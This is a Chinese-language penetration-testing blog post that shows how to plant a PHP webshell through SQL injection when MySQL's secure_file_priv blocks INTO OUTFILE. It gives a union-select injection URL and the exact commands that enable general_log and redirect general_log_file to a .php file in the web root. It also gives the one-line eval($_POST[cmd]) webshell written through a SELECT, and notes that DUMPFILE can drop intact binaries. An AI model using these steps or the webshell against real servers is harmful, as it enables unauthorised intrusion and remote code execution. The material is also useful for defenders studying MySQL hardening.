---
title: SQL注入写shell不成功后
date: 2018-01-11 13:20:46
tags:
		- SQLi
categories:
		- 渗透技巧

---

之前遇到`sql`注入，且是`root`权限后，很容易直接写进去`shell`。现在的`Mysql`数据库的安全性也高了，即使注入得到`mysql`的`root`权限，有时候还是写不进去`shell`。

<!-- more -->

##### SQL 注入写 shell



	http://127.0.0.1:8000/waf/test.php?id=-1' union select 1,2,3 --+

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-11/29934024.jpg)

`root`权限

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-11/90894676.jpg)

写一句话的时候，报错。如果能进入`phpmyadmin`后台，可以试试一个方法。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-11/49908215.jpg)

就是`--secure-file-priv`的问题。

本地测试。

`Mysql`导出文件时报错

	mysql> select host from mysql.user into outfile 'E:\\test\\1.txt';
	ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv opti
	on so it cannot execute this statement

报错原因:`secure_file_priv`设置了指定目录，需要在指定目录下进行数据导出。

	mysql> show variables like '%secure%';
	+------------------+-------+
	| Variable_name    | Value |
	+------------------+-------+
	| secure_auth      | OFF   |
	| secure_file_priv | NULL  |
	+------------------+-------+
	2 rows in set (0.00 sec)

[`secure_file_priv`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) 参数为空，表示没有可以导出的目录。

>这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户具有FILE权限。 
如果这个参数为空，这个变量没有效果； 
如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它； 
如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入

执行一下命令，在终端是修改不了`secure_file_priv`的值的。

	mysql> show variables like '%secure%';
	+------------------+-------+
	| Variable_name    | Value |
	+------------------+-------+
	| secure_auth      | OFF   |
	| secure_file_priv | NULL  |
	+------------------+-------+
	2 rows in set (0.20 sec)
	
	mysql> set global secure_file_priv = 'D:\\phpStudy\\www\\waf\\shell\\1.txt';
	ERROR 1238 (HY000): Variable 'secure_file_priv' is a read only variable




此时是`root`权限，`into outfile`写不了文件。这个时候，如果能登录到`phpmyadmin`，可以尝试一个方法。

在`phpmyadmin`后台中，查看全局变量：找到`general log file`和`general log`

将`general log`设置为`ON`

`general log file` 设置为`shell`的物理地址。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-11/47520310.jpg)


再执行一个写一句话的`SQL`语句。虽然还有报错，但是已经写入进去了。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-11/49908215.jpg)

在`D:\phpStudy\www\waf\phpinfo.php`中可以看到写入的`php`代码。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-11/75606276.jpg)

访问。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-11/87593369.jpg)

	general_log
	Command-Line Format	--general-log
	System Variable	Name	general_log
	Scope	Global
	Dynamic	Yes
	Permitted Values	Type	boolean
	Default	OFF
	
	Whether the general query log is enabled. The value can be 0 (or OFF) to disable the log or 1 (or ON) to enable the log. The default value depends on whether the --general_log option is given. The destination for log output is controlled by the log_output system variable; if that value is NONE, no log entries are written even if the log is enabled.
	
	general_log_file
	Command-Line Format	--general-log-file=file_name
	System Variable	Name	general_log_file
	Scope	Global
	Dynamic	Yes
	Permitted Values	Type	file name
	Default	host_name.log
	
	The name of the general query log file. The default value is host_name.log, but the initial value can be changed with the --general_log_file option. 

如果登录不了`phpmyadmin`后台，试试能登录`mysql`终端吗？可以试着来执行以下命令。
	
	show variables like '%general%'; #查看配置
	set global general_log = on;  #开启general log模式
	set global general_log_file = 'D:\\phpStudy\www\\waf\\shell.php'; #设置写入shell路径
	select '<?php eval($_POST[cmd]);?>'  #写入shell


##### [SELECT ... INTO Syntax](https://dev.mysql.com/doc/refman/5.7/en/select-into.html)

`window`环境下在`my.ini`中设置		`secure-file-priv="D:/phpStudy/www/waf"` 为数据库的导入和导出路径。

`Ubuntu`环境下

SELECT的SELECT ... INTO形式可以使查询结果存储在变量中或写入文件中。导出数据到文本文件中。

- SELECT ... INTO OUTFILE将选定的行写入文件。可以指定列和行结束符以产生特定的输出格式。 

- SELECT ... INTO DUMPFILE将单行写入文件而不使用任何格式。

* `outfile`

区别：

	mysql> select host from mysql.user into outfile 'D:/phpStudy/www/waf/test.txt';
	Query OK, 3 rows affected (0.00 sec)

内容：

	127.0.0.1
	::1
	localhost

* `dumpfile`

	mysql> select host from mysql.user into dumpfile 'D:/phpStudy/www/waf/test1.txt'
	;
	ERROR 1172 (42000): Result consisted of more than one row

只能导出一行内容。

若把一个可执行2进制文件用`into outfile`函数导出，导出后可能会被破坏，因为`into outfile`函数会在行末写入新行，并且会转义换行符。这样2进制可执行文件会被破坏。这个时候用`into dumpfile`就能导出一个完整的可执行的2进制文件。


##### 参考

[mysql dumpfile 与 outfile 函数的区别](http://vinc.top/2016/06/17/mysql-dumpfile-%E4%B8%8E-outfile-%E5%87%BD%E6%95%B0%E7%9A%84%E5%8C%BA%E5%88%AB/)

[mysql5.7.6以后 的root注入 ](https://www.t00ls.net/viewthread.php?tid=40509)

[mysql进行getshell新姿势](http://www.am0s.com/penetration/267.html)


	

